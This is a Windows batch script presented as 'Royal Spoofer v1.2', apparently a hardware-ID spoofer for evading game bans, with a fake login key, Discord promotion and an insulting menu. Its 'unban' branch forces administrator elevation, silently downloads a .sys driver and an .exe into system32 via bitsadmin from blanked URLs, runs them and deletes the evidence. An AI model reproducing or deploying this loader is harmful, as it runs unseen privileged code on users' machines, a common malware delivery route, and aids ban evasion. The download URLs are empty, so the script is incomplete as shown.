@echo off
setlocal
echo.
net session >nul 2>&1
if %errorLevel% == 0 (
  echo Running with administrative privileges
) else (
  powershell start -verb runas '%0'
  exit
)

cls
chcp 65001
title .gg/reversing
mode 100,50
timeout 1 > nul
set COLOR_BLACK=[30m>nul
set COLOR_BLUE=[34m>nul
set COLOR_CYAN=[36m>nul
set COLOR_GREEN=[32m>nul
set COLOR_PURPLE=[35m>nul
set COLOR_RED=[31m>nul
set COLOR_WHITE=[37m>nul
set COLOR_YELLOW=[33m>nul
set COLOR_BRIGHTBLACK=[1;30m>nul
set COLOR_BRIGHTBLUE=[1;34m>nul
set COLOR_BRIGHTCYAN=[1;36m>nul
set COLOR_BRIGHTGREEN=[1;32m>nul
set COLOR_BRIGHTPURPLE=[1;35m>nul
set COLOR_BRIGHTRED=[1;31m>nul
set COLOR_BRIGHTWHITE=[1;37m>nul
set COLOR_BRIGHTYELLOW=[1;33m>nul
set COLOR_BG_BLACK=[40m>nul
set COLOR_BG_BLUE=[44m>nul
set COLOR_BG_CYAN=[46m>nul
set COLOR_BG_GREEN=[42m>nul
set COLOR_BG_PURPLE=[45m>nul
set COLOR_BG_RED=[41m>nul
set COLOR_BG_WHITE=[47m>nul
set COLOR_BG_YELLOW=[43m>nul
set COLOR_RESET=[0m>nul

:start
cls	
title Login
echo.
echo %COLOR_PURPLE%██╗      ██████╗  ██████╗ ██╗███╗   ██╗
echo ██║     ██╔═══██╗██╔════╝ ██║████╗  ██║
echo ██║     ██║   ██║██║  ███╗██║██╔██╗ ██║
echo ██║     ██║   ██║██║   ██║██║██║╚██╗██║
echo ███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║
echo ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝%COLOR_RESET%
echo.                                      
set /p log=Enter Key: 
if %log% == lol goto loading
echo %COLOR_RED%wrong key %COLOR_RESET%
timeout 2 > nul
goto start

:loading
timeout 1 > nul
title loading
cls
echo Loading..
cls
timeout 1 > nul
echo [  	              ]
timeout 1 > nul
cls
echo [II	              ]
timeout 1 > nul
cls
echo [IIII	              ]
timeout 1 > nul
cls
echo [IIIIIIIII               ]
timeout 1 > nul
cls
echo [IIIIIIIIIIIII           ]
timeout 1 > nul
cls
echo [IIIIIIIIIIIIIIIIII      ]
timeout 1 > nul
cls
mode 50,10
echo %COLOR_RESET%[%COLOR_PURPLE%IIIIIIIIIIIIIIIIIIIIIIII%COLOR_RESET%]%COLOR_PURPLE% Completed%COLOR_RESET%
timeout 2 > nul 

:main
mode 100,40
title Welcome %username%
cls
timeout 2 > nul
title Royal Spoofer v1.2
echo "%COLOR_PURPLE%credits%COLOR_RESET%" for %COLOR_PURPLE%Creds%COLOR_RESET%
echo "%COLOR_PURPLE%unban%COLOR_RESET%" To %COLOR_PURPLE%Spoof%COLOR_RESET%
echo "%COLOR_PURPLE%serials%COLOR_RESET%" To %COLOR_PURPLE%Check Serials%COLOR_RESET%
echo.
set /p spoof=Input:

if %spoof% == unban goto spoof
if %spoof% == credits goto creds
if %spoof% == serials goto checker

echo wrong option u retard
timeout 2 > nul
goto main

:spoof
cls
echo %COLOR_PURPLE%S%COLOR_RESET%
timeout 1 > nul
cls
echo S%COLOR_PURPLE%p%COLOR_RESET%
timeout 1 > nul
cls
echo Sp%COLOR_PURPLE%o%COLOR_RESET%
timeout 1 > nul
cls
echo Spo%COLOR_PURPLE%o%COLOR_RESET%
timeout 1 > nul
cls
echo Spoo%COLOR_PURPLE%f%COLOR_RESET%
timeout 1 > nul
cls
echo Spoof%COLOR_PURPLE%i%COLOR_RESET%
timeout 1 > nul
cls
echo Spoofi%COLOR_PURPLE%n%COLOR_RESET%
timeout 1 > nul
cls
echo Spoofin%COLOR_PURPLE%g%COLOR_RESET%
timeout 1 > nul
cls
echo %COLOR_PURPLE%Spoofing%COLOR_RESET%
timeout 1 > nul
@echo off
set "url1=   "
set "url2=   "   
set "cd=C:\Windows\system32"

bitsadmin /transfer "DownloadJob1" %url1% "%cd%\name.sys" /quiet
if errorlevel 1 echo Error: Could not download name.sys && pause && exit /b
bitsadmin /transfer "DownloadJob2" %url2% "%cd%\name.exe" /quiet
if errorlevel 1 echo Error: Could not download name.exe && pause && exit /b

if not exist "%cd%\name.exe" (
  echo Error: Sprite.exe not found in %cd% && pause && exit /b
)

start "" "%cd%\name" "%cd%\name"
if errorlevel 1 echo Error: Could not start name.exe && pause && exit /b

del "%cd%\name.sys"
if errorlevel 1 echo Error: Could not delete name.sys && pause && exit /b

del "%cd%\name.exe"
if errorlevel 1 echo Error: Could not delete name.exe && pause && exit /b
pause
cls
echo Spoofed...
timeout 2 > nul
goto main
:creds
cls
echo Made By %COLOR_PURPLE%Peroxide%COLOR_RESET% Join The Disc %COLOR_PURPLE%".gg/reversing"%COLOR_RESET%
echo.
set /p serv=press %COLOR_PURPLE%1%COLOR_RESET% to %COLOR_PURPLE%join%COLOR_RESET% the %COLOR_PURPLE%server%COLOR_RESET% or %COLOR_PURPLE%2%COLOR_RESET% to go back: 
if %serv% == 1 start https://discord.gg/lunarware
timeout 2 > nul
goto main

:checker
cls
echo %COLOR_BRIGHTBLACK%diskdrive serials%COLOR_RESET%
wmic diskdrive get serialnumber
echo.
set /p ser=Press %COLOR_PURPLE%1%COLOR_RESET% To Check Again Press %COLOR_PURPLE%2%COLOR_RESET% To Go Back: 
if %ser% == 1 goto checker
if %ser% == 2 goto main
echo wtf is that
timeout 2 > nul
goto main